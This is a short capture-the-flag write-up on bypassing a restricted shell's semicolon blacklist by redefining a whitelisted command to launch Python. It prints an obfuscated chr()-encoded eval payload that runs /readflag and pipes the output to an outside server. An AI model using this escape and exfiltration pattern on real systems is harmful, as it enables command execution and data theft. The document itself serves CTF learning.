# babyshock revenge

- updated version of babyshock with `;` blacklisted.
- Instead of semi-colon, we can redefine any of the whitelisted commands as a function.
- Final payload was like:
```
> ls () python3
> ls
> touch = eval(chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6d)+chr(0x70)+chr(0x6f)+chr(0x72)+chr(0x74)+chr(0x5f)+chr(0x5f)+chr(0x28)+chr(0x22)+chr(0x6f)+chr(0x73)+chr(0x22)+chr(0x29)+chr(0x2e)+chr(0x73)+chr(0x79)+chr(0x73)+chr(0x74)+chr(0x65)+chr(0x6d)+chr(0x28)+chr(0x22)+chr(0x2f)+chr(0x72)+chr(0x65)+chr(0x61)+chr(0x64)+chr(0x66)+chr(0x6c)+chr(0x61)+chr(0x67)+chr(0x20)+chr(0x7c)+chr(0x6e)+chr(0x78)+chr(0x20)+chr(0x68)+chr(0x61)+chr(0x78)+chr(0x2e)+chr(0x70)+chr(0x65)+chr(0x72)+chr(0x66)+chr(0x65)+chr(0x63)+chr(0x74)+chr(0x2e)+chr(0x62)+chr(0x6c)+chr(0x75)+chr(0x65)+chr(0x20)+chr(0x36)+chr(0x39)+chr(0x36)+chr(0x39)+chr(0x22)+chr(0x29))
```

- Running `python3`, it apparently sends your next commands to an interactive python shell.
- The payload executes /readflag and pipes the output to our server.
